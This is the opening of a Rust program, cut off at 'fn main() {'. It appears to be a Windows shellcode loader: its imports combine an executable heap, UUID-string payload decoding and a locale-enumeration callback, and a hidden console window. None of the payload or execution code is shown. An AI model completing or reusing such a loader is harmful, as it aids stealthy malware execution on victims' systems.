#![windows_subsystem = "windows"]
use base64;
use std::str;
use std::process;
use std::mem::transmute;
use std::ffi::CString;
use winapi::um::heapapi::{HeapCreate, HeapAlloc};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnls::{EnumSystemLocalesA, LOCALE_ENUMPROCA};
use winapi::um::winnt::{HEAP_CREATE_ENABLE_EXECUTE};
use winapi::shared::basetsd::DWORD_PTR;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use windows::Win32::System::Rpc::{RPC_STATUS, UuidFromStringA};
use windows::core::GUID;

fn main() {